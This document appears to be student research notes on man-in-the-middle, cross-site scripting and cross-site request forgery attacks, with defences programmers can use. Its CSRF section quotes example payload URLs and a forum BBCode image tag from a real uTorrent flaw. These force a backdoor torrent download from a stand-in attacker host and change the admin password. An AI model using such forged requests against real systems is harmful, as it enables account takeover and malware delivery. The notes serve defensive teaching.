# Attacks Research

![](https://media.giphy.com/media/Fhpur9kWl1ilq/giphy.gif)

What are some of the main forms of cyber attacks and how can we protect against them as programmers?

## Man In The Middle (MITM)

![man](https://media.giphy.com/media/11OfetuCxqI8y4/giphy.gif)

### What are they?
A man-in-the-middle attack is a type of cyberattack where a malicious actor inserts him/herself into a conversation between two parties, impersonates both parties and gains access to information that the two parties were trying to send to each other. A man-in-the-middle attack allows a malicious actor to intercept, send and receive data meant for someone else, or not meant to be sent at all, without either outside party knowing until it is too late.
#### Key concepts:
* Man-in-the-middle is a type of eavesdropping attack that occurs when a malicious actor inserts himself as a relay/proxy into a communication session between people or systems.
* A MITM attack exploits the real-time processing of transactions, conversations or transfer of other data.
* Man-in-the-middle attacks allow attackers to intercept, send and receive data never meant to be for them without either outside party knowing until it is too late.

#### What would it look like?
In this image we see how MITM attach can result in Jill sending Money intended for Jack to the eavesdropping attacker Peter. He manages to do this by impersonating both sides of the conversation. This example holds true for a conversation with a client and server as well as person-to-person conversations.


![Man in the middle attach diagram](https://www.veracode.com/sites/default/files/styles/media_responsive_widest/public/mitm-steps.gif?itok=jARsU2dF)
#### Where can they happen:
There are three main ways in which a MITM attack can happen:

__1. Over Wifi__
An attacker will set up a legitimate sounding wifi connection and simply wait for people to join the network and he'll have all your information.
__2. On a 'session'__
Once you log into a website, a connection between your computer and the website is established. Hackers can hijack your session with the website through numerous means. One popular option they use is stealing your browser __cookies__.
__3. Through Email__
 Once they gain access to important email accounts, they will monitor the transactions to make their eventual attack a lot more convincing.

### How can you defend against them?
HTTPS is vital in preventing MITM attacks as it makes it difficult for an attacker to obtain a valid certificate for a domain that is not controlled by him, thus preventing eavesdropping.

## Cross-Site Scripting (XSS)
![scary box](https://media.giphy.com/media/LbzvZLyjqD184/giphy.gif)
### What are they?
Cross-Site Scripting attacks enable attackers to inject client-side scripts into websites viewed by other users. The cybersecuirty company Hacker One claimed these kinds of attacks are the most common found by their company in others' websites ([source](http://www.zdnet.com/article/at-30000-for-a-flaw-bug-bounties-are-big-and-getting-bigger/)).

![Diagram of a XSS attack](https://user-images.githubusercontent.com/23265724/29075871-b061e43a-7c4b-11e7-8f47-29309f77ac65.png)

### What problems can they cause?
* Can access to all the same objects the rest of the web page has, including cookies with session tokens → identity theft!
* Can make arbitrary DOM changes
* Can send HTTP requests with arbitrary content to arbitrary destinations with `XMLHttpRequest`
* Can leverage HTML5 APIs to access a user’s geolocation, webcam, microphone and even the specific files from thxe user’s file system (especially if combined with other attack strategies meaning the user 'approves' these requests)
* In combination with other attack strategies, this can help attackers escalate their to advanced attacks including keylogging, phishing and identity theft.

### How can you defend against them?
> An XSS vulnerability can only exist if the payload (malicious script) that the attacker inserts ultimately gets parsed by the victim's browser. (HTML in the above case).
>

When defending against XSS, there are two key considerations:
* Are you **encoding** or **validating** inputs?
* **Where** are you performing your encoding/validation?
    * As the inputs could be used in several different places by your server or site, encoding/validating on input is not a comprehensive defence.
    * If the input is being used in the back-end, use server-side methods
    * If the input is only being used in the front-end, use client-side methods

Some approaches to consider:
1) Encoding (e.g. parsing anything inserted as a string, so `<script>` tags are encoded as `&lt;script&lt;`)
    * Some methods will do this automatically for you, e.g.: `node.textContent = userInput`, `element.setAttribute(attribute, userInput)`, `element[attribute] = userInput`, `	window.encodeURIComponent(userInput)` and `element.style.property = userInput`
    * One case where encoding doesn't help is where the site JavaScript manipulates links in the DOM - attackers could add a URL that starts with `javascript:`, which would cause any subsequent script to be executed.
2) Cookie security! Many web applications tie session cookies to the IP address of the user who originally logged in, then only permit that IP to use that cookie.
    * This is effective in most situations (if an attacker is only after the cookie), but obviously breaks down in situations where an attacker is behind the same NATed IP address or web proxy as the victim, or the victim is changing his or her mobile IP.
    * Another mitigation is an HttpOnly flag which allows a web server to set a cookie that is unavailable to client-side scripts. While beneficial, the feature can neither fully prevent cookie theft nor prevent attacks within the browser.
3) Contextual output encoding/escaping of string input: "Good but not always sufficient, applying it depends on where the string will go and whether the application accepts "rich" data.
4) Safely validating untrusted HTML input: Things to keep in mind are that: tags such as `<script>`, `<object>`, `<embed>`, and `<link>` are removed by the sanitization process. You can also run it through HTML sanitisation engines. Also potentially dangerous attributes such as the onclick attribute are removed in order to prevent malicious code from being injected.
    * Read more: [link](https://macwright.org/2012/01/10/iframes.html)
5) Disabling scripts : some web applications are written to allow operation without the need for any client-side scripts.
    * The downside to this is blocking all scripts on all websites by default is substantial reduction in functionality and responsiveness.
6) Emerging defensive technologies (i.e.  Content Security Policy, Javascript sandbox tools, auto-escaping templates)
    * Find out about Content Security Policy [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) . Sadly it's not very IE-friendly.
## Cross Site Request Forgery (CSRF)
![sneaky](https://media.giphy.com/media/yNOAh1hgmUxWg/giphy.gif)
### What are they?
Cross-site request forgery, also known as one-click attack or session riding and abbreviated as CSRF (sometimes pronounced sea-surf), is a type of malicious exploit of a website where unauthorized commands are transmitted from a user that the web application trusts. Unlike cross-site scripting (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user's browser.

### Confused Deputy Attacks
CSRF attacks are an example of a confused deputy attack against the browser, in this case a confused deputy is a computer program that is innocently fooled by some other party into misusing its authority. It is a specific type of privilege escalation.

#### Example
In the original example of a confused deputy, there is a program that provides compilation services to other programs. Normally, the client program specifies the name of the input and output files, and the server is given the same access to those files that the client has.

The compiler service is pay-per-use, and the compiler service stores its billing information in a file (dubbed BILL) that only it has access to.

Now suppose a client calls the service and names its output file BILL. The service opens the output file. Even though the client did not have access to that file, the service does, so the open succeeds, and the server writes the compilation output to the file, overwriting it, and thus destroying the billing information.

### How
Attackers would embed a link that executes a specific action on a target web page/application that if clicked whilst that victim is **logged in** to that website/app would run with the users browsers privileges.The attack carrier link may be placed in a location that the victim is likely to visit while logged into the target site (for example, a discussion forum), or sent in a HTML email body or attachment. It is worth bearing in mind that this attack is blind; the attacker can't see what the target website sends back to the victim in response to the forged requests, unless they exploit a cross-site scripting or other bug at the target website.

### Real World Examples
A real CSRF vulnerability in uTorrent (CVE-2008-6586) exploited the fact that its web console accessible at localhost:8080 allowed mission-critical actions to be executed as a matter of simple GET request:

An attacker could force a .torrent file download
``http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent``

Change uTorrent administrator password
``http://localhost:8080/gui/?action=setsetting&s=webui.password&v=eviladmin``

These specific attacks were launched by placing malicious, automatic-action HTML image elements on forums and email spam, so that browsers visiting these pages would open them automatically, without much user action. People running vulnerable uTorrent version at the same time as opening these pages were susceptible to the attack.

An example in BBCode typically found on forums (where you can't normally post javascript):
``[img]http://localhost:8080/gui/?action=add-url&amp;s=http://evil.example.com/backdoor.torrent[/img]``

At risk are web applications that perform actions based on input from trusted and authenticated users without requiring the user to authorize the specific action. A user who is authenticated by a cookie saved in the user's web browser could unknowingly send an HTTP request to a site that trusts the user and thereby causes an unwanted action.

#### GET
In HTTP GET the CSRF exploitation is trivial, using methods described above, such as a simple hyperlink containing manipulated parameters and automatically loaded by a IMG tag. By the HTTP specification however, GET should be used as a safe method, that is, not significantly changing user's state in the application. Applications using GET for such operations should switch to HTTP POST or use anti-CSRF protection.

### How can you defend against them?
Prevention measures that DO NOT work:

1) Using a secret cookie
Remember that all cookies, even the secret ones, will be submitted with every request. All authentication tokens will be submitted regardless of whether or not the end-user was tricked into submitting the request. Furthermore, session identifiers are simply used by the application container to associate the request with a specific session object. The session identifier does not verify that the end-user intended to submit the request.

2) Only accepting POST requests
 There are numerous methods in which an attacker can trick a victim into submitting a forged POST request, such as a simple form hosted in an attacker's Website with hidden values. This form can be triggered automatically by JavaScript or can be triggered by the victim who thinks the form will do something else.

3) Multi-step transactions
Multi-Step transactions are not an adequate prevention of CSRF. As long as an attacker can predict or deduce each step of the completed transaction, then CSRF is possible.

4) URL rewriting: This might be seen as a useful CSRF prevention technique as the attacker cannot guess the victim's session ID. However, the user’s session ID is exposed in the URL. We don't recommend fixing one security flaw by introducing another.

5) HTTPS: does nothing to prevent against CSRF

THINGS THAT DO WORK:

Once you have verified that the request appears to be a same origin request so far, we recommend a second check as an additional precaution to really make sure. This second check can involve custom defense mechanisms using CSRF specific tokens created and verified by your application or can rely on the presence of other HTTP headers depending on the level of rigor/security you want.

There are numerous ways you can specifically defend against CSRF. We recommend using one of the following (in ADDITION to the check recommended above):

1. Synchronizer (i.e.,CSRF) Tokens (requires session state)

Any state changing operation requires a secure random token (e.g., CSRF token) to prevent CSRF attacks
Characteristics of a CSRF Token
Unique per user session
Large random value
Generated by a cryptographically secure random number generator
The CSRF token is added as a hidden field for forms or within the URL if the state changing operation occurs via a GET
The server rejects the requested action if the CSRF token fails validation

Approaches that do require no server side state:

2. Double Cookie Defense
3. Encrypted Token Pattern
4. Custom Header - e.g., X-Requested-With: XMLHttpRequest

READ MORE: [link](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#Prevention_Measures_That_Do_NOT_Work)

## Resources

__MITM__
* [Wikipedia](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
* [Vera Code](https://www.veracode.com/security/man-middle-attack)

__XSS__
* [Excess XSS - clear and comprehensive](https://excess-xss.com/)
* [XSS information](https://www.acunetix.com/websitesecurity/cross-site-scripting/)
* [XSS Prevention 'cheat sheet' - sorry, Rebecca!](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
    * [Specific XSS prevention information for DOM](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)

----

By @jen-harris, @rogeredbacon, @rachaelcodes & @ polyccon

![](https://media.giphy.com/media/o0vwzuFwCGAFO/giphy.gif)
